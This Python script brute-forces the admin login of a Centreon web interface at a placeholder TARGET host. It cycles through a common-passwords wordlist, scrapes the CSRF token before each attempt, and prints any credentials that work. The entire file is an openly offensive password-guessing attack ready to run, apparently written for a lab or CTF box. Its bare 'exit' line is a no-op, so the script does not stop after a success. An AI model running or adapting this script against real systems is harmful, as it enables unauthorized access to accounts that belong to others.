#!/usr/bin/env python3
#
# Copyright 2020 Marcos Azevedo (aka pylinux) : psylinux[at]gmail.com
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#

import requests
from bs4 import BeautifulSoup


url = 'http://TARGET/centreon/index.php'
wordlist = '/usr/share/wordlists/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt'
s = requests.session()


def sendRequests(username, password):
    page = s.get(url)
    soup = BeautifulSoup(page.content, 'html.parser')
    token = soup.find('input', attrs={'name': 'centreon_token'})['value']
    data = {'useralias': username,
            'password': password,
            'submitLogin': 'Connect',
            'centreon_token': token}
    response = s.post(url, data=data)

    if 'incorrect' not in response.text:
        print('Credentials found {}:{}'.format(username, password))
        exit


with open(wordlist) as wordlist:
    for word in wordlist:
        password = word.rstrip()
        print('[*] Trying {}'.format(password))
        sendRequests('admin', password)
